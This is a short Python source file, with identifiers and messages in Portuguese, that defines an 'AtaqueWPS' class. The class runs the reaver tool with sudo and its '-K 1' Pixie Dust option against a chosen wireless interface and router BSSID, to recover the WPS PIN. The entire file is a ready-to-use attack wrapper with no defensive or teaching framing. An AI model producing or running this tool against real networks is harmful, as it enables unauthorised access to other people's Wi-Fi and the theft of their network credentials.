import subprocess

class AtaqueWPS:
    def __init__(self, interface, bssid):
        self.interface = interface
        self.bssid = bssid

    def executar(self):
        try:
            resultado = subprocess.run(
                ['sudo', 'reaver', '-i', self.interface, '-b', self.bssid, '-vv', '-K', '1'],
                capture_output=True,
                text=True,
                timeout=300,
                check=True
            )
            return resultado.stdout
        except subprocess.CalledProcessError as e:
            return f"Erro: {e.stderr}"
        except subprocess.TimeoutExpired:
            return "Tempo esgotado - Ataque não concluído"